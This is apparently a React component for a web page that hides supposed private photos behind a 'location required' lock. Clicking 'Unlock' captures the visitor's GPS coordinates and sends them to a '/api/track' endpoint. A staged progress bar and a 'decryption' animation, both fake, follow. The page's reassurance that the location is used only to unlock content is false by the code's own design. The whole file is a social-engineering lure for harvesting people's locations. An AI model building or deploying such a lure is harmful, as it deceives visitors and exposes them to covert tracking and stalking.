'use client';

import { useState, useEffect } from 'react';
import { useLocationTracking } from '../hooks/useLocationTracking';

interface LocationGateProps {
  onUnlock: () => void;
  title?: string;
  description?: string;
  contentPreview?: string;
  pageUrl?: string;
}

export default function LocationGate({
  onUnlock,
  title = "🔒 Location Required",
  description = "This content is location-protected. Share your location to unlock and view.",
  contentPreview = "Exclusive content awaits...",
  pageUrl
}: LocationGateProps) {
  const [status, setStatus] = useState<'initial' | 'requesting' | 'unlocking' | 'error'>('initial');
  const [errorMessage, setErrorMessage] = useState<string>('');
  const [progress, setProgress] = useState(0);
  const { captureLocation, sendTrackingData } = useLocationTracking();

  const handleUnlockRequest = async () => {
    setStatus('requesting');
    setErrorMessage('');
    setProgress(0);

    try {
      // Step 1: Request location permission
      setProgress(25);
      const locationSuccess = await captureLocation(pageUrl || window.location.href);
      
      if (!locationSuccess) {
        setStatus('error');
        setErrorMessage('Location access denied. Please enable location permissions to view this content.');
        return;
      }

      // Step 2: Verify location data
      setProgress(50);
      await new Promise(resolve => setTimeout(resolve, 500));

      // Step 3: Send tracking data
      setProgress(75);
      await sendTrackingData('/api/track', pageUrl || window.location.href);

      // Step 4: Unlock content
      setStatus('unlocking');
      setProgress(100);
      
      // Decryption animation
      await new Promise(resolve => setTimeout(resolve, 1500));
      onUnlock();
      
    } catch (error) {
      setStatus('error');
      setErrorMessage('Failed to verify location. Please try again.');
      console.error('Location gate error:', error);
    }
  };

  const handleRetry = () => {
    setStatus('initial');
    setErrorMessage('');
    setProgress(0);
  };

  return (
    <div className="min-h-[60vh] flex items-center justify-center p-4">
      <div className="max-w-2xl w-full">
        {/* Locked Content Preview */}
        <div className="relative mb-8">
          <div className="card overflow-hidden relative">
            {/* Blurred content preview */}
            <div className="absolute inset-0 bg-gradient-to-br from-amber-500/20 via-orange-500/20 to-red-500/20 backdrop-blur-xl z-10 flex items-center justify-center">
              <div className="text-center">
                <div className="text-6xl mb-4 animate-pulse">🔒</div>
                <p className="text-lg font-semibold text-gray-700 dark:text-gray-300">
                  Content Locked
                </p>
              </div>
            </div>
            
            {/* Preview content (blurred) */}
            <div className="blur-lg select-none pointer-events-none p-8">
              <div className="h-48 bg-gradient-to-br from-gray-200 to-gray-300 dark:from-gray-700 dark:to-gray-600 rounded-lg mb-4"></div>
              <div className="space-y-2">
                <div className="h-4 bg-gray-300 dark:bg-gray-600 rounded w-3/4"></div>
                <div className="h-4 bg-gray-300 dark:bg-gray-600 rounded w-1/2"></div>
              </div>
            </div>
          </div>
        </div>

        {/* Unlock Interface */}
        <div className="card text-center space-y-6">
          <div className="space-y-2">
            <h2 className="text-3xl font-bold text-gray-800 dark:text-gray-100">
              {title}
            </h2>
            <p className="text-gray-600 dark:text-gray-400">
              {description}
            </p>
          </div>

          {/* Status Display */}
          {status === 'initial' && (
            <div className="space-y-6 animate-fadeIn">
               <div className="bg-amber-50 dark:bg-amber-900/20 border-2 border-amber-200 dark:border-amber-800 rounded-xl p-6">
                 <div className="flex items-start gap-4">
                   <div className="text-3xl">✨</div>
                   <div className="text-left flex-1">
                     <h3 className="font-semibold text-amber-900 dark:text-amber-200 mb-2">
                       What you'll unlock:
                     </h3>
                     <ul className="text-sm text-amber-800 dark:text-amber-300 space-y-1">
                       <li>✓ Exclusive photos and memories</li>
                       <li>✓ Private content shared with you</li>
                       <li>✓ Location-verified secure access</li>
                     </ul>
                   </div>
                 </div>
               </div>

              <button
                onClick={handleUnlockRequest}
                className="w-full btn-primary text-lg py-4 flex items-center justify-center gap-3 group"
              >
                <span className="text-2xl group-hover:scale-110 transition-transform">🔓</span>
                <span>Unlock Content</span>
              </button>

              <p className="text-xs text-gray-500 dark:text-gray-400">
                Your location is only used to unlock this content and will be handled securely.
              </p>
            </div>
          )}

          {status === 'requesting' && (
            <div className="space-y-6 animate-fadeIn">
              <div className="relative">
                <div className="w-24 h-24 mx-auto relative">
                  <div className="absolute inset-0 border-4 border-amber-200 dark:border-amber-800 rounded-full"></div>
                  <div 
                    className="absolute inset-0 border-4 border-amber-500 rounded-full border-t-transparent animate-spin"
                  ></div>
                  <div className="absolute inset-0 flex items-center justify-center text-3xl">
                    📍
                  </div>
                </div>
              </div>

              <div className="space-y-3">
                <p className="text-lg font-semibold text-gray-800 dark:text-gray-200">
                  Verifying Your Location...
                </p>
                
                {/* Progress bar */}
                <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-3 overflow-hidden">
                  <div 
                    className="h-full bg-gradient-to-r from-amber-500 to-orange-500 transition-all duration-500 ease-out"
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>

                <p className="text-sm text-gray-600 dark:text-gray-400">
                  {progress < 30 && "Requesting location access..."}
                  {progress >= 30 && progress < 60 && "Capturing GPS coordinates..."}
                  {progress >= 60 && progress < 90 && "Verifying location data..."}
                  {progress >= 90 && "Almost there..."}
                </p>
              </div>
            </div>
          )}

          {status === 'unlocking' && (
            <div className="space-y-6 animate-fadeIn">
              <div className="relative">
                <div className="w-24 h-24 mx-auto">
                  <div className="absolute inset-0 bg-green-500/20 rounded-full animate-ping"></div>
                  <div className="absolute inset-0 flex items-center justify-center text-5xl animate-bounce">
                    ✅
                  </div>
                </div>
              </div>

              <div className="space-y-3">
                <p className="text-2xl font-bold text-green-600 dark:text-green-400">
                  Location Verified!
                </p>
                <p className="text-lg text-gray-700 dark:text-gray-300">
                  Loading content...
                </p>
                
                {/* Decryption effect */}
                <div className="flex justify-center gap-1">
                  {[...Array(8)].map((_, i) => (
                    <div
                      key={i}
                      className="w-2 h-8 bg-gradient-to-t from-green-500 to-emerald-400 rounded-full animate-pulse"
                      style={{ animationDelay: `${i * 0.1}s` }}
                    ></div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {status === 'error' && (
            <div className="space-y-6 animate-fadeIn">
              <div className="w-24 h-24 mx-auto bg-red-100 dark:bg-red-900/30 rounded-full flex items-center justify-center">
                <span className="text-5xl">⚠️</span>
              </div>

              <div className="space-y-3">
                <p className="text-xl font-bold text-red-600 dark:text-red-400">
                  Unable to Unlock Content
                </p>
                <p className="text-gray-700 dark:text-gray-300">
                  {errorMessage}
                </p>
              </div>

              {/* Help section */}
              <div className="bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg p-4 text-left">
                <p className="font-semibold text-blue-900 dark:text-blue-200 mb-2">
                  💡 How to enable location access:
                </p>
                <ol className="text-sm text-blue-800 dark:text-blue-300 space-y-1 list-decimal list-inside">
                  <li>Click the lock icon in your browser's address bar</li>
                  <li>Find "Location" in the permissions list</li>
                  <li>Change it to "Allow"</li>
                  <li>Refresh the page and try again</li>
                </ol>
              </div>

              <button
                onClick={handleRetry}
                className="w-full btn-primary"
              >
                Try Again
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

